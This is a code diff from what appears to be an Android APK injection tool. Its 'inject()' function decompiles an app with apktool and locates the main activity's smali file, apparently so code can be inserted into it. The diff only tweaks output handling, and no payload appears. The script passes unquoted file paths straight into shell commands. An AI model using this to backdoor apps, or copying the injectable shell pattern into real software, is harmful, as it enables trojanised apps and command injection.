@@ -31,8 +31,8 @@ def inject():
             sys.exit(1)
         a1,a2 = os.path.split(fullpath)
         os.system("cp -r "+fullpath+" "+a2)
-        pkgname = os.popen('''aapt dump badging '''+a2+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").read()
-        pkgactivity = os.popen('''aapt dump badging '''+a2+''' | awk '/activity/{gsub("name=|'"'"'","");'''+"""  print $2}'""").read()
+        pkgname = os.popen('''aapt dump badging '''+a2+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline()
+        pkgactivity = os.popen('''aapt dump badging '''+a2+''' | awk '/activity/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline()
         print(b+"[+]"+w+" decompiling "+a2+" using apktool 2.3.4")
         print(b+"[+]"+w+" please wait, this could take a while")
         os.system("proot apktool d -f "+a2+" &> /dev//null")
@@ -46,9 +46,9 @@ def inject():
         if "MainActivity.smali" in pathsmali:
             pathsmali = os.popen("find -O3 -L "+a3+" -name 'MainActivity.smali'").readline()
             print(w+"----------------------------------------------------")
-            print(g+"[✓]"+w+" package name is obtained:-"+y,pkgname.replace("\n",""))
-            print(g+"[✓]"+w+" activity detected:-"+y,pkgactivity.replace("\n",""))
-            print(g+"[✓]"+w+" smali file:- "+y+pathsmali
+            print(g+"[✓]"+w+" package name is obtained:-"+y,pkgname)
+            print(g+"[✓]"+w+" activity detected:-"+y,pkgactivity)
+            print(g+"[✓]"+w+" smali file:- "+y+pathsmali)
         else:
             print(r+"[!]"+w+" main.activity smali doesnt exist, you can choose manually")
             print("----------------------------------------------------\n\n"+y+pathsmali+w+"\n----------------------------------------------------")
